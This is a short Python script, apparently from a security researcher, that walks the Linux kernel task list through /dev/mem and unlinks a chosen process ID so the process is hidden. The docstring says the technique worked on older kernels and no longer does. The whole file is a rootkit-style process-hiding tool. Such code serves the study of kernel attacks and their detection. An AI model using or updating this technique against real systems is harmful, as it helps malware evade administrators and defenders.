#!/usr/bin/python

"""
Remove an item from the task list.
This technique hid a process in older
kernel versions.  It doesn't work anymore.

Ryan Riley
rriley.cs@gmail.com
"""

import os, sys
from ctypes import *

from kstructs import *
from memreader import *
from symbolfinder import *

if len(sys.argv) != 2:
	print "Usage: ",
	print sys.argv[0],
	print " <pid to remove>"
	sys.exit(-1)

the_pid = int(sys.argv[1])

sf = SymbolFinder()
dm = DevMemReader(sf)

p = task_struct()

init_task = sf.find("init_task")
dm.read(p,init_task)
dm.read(p,p.next())

while p.pid != 0:
	dm.read(p,p.next())
	print p.pid
	if p.pid == the_pid:
		print "Found it!"
		p.tasks.remove(dm)
		break
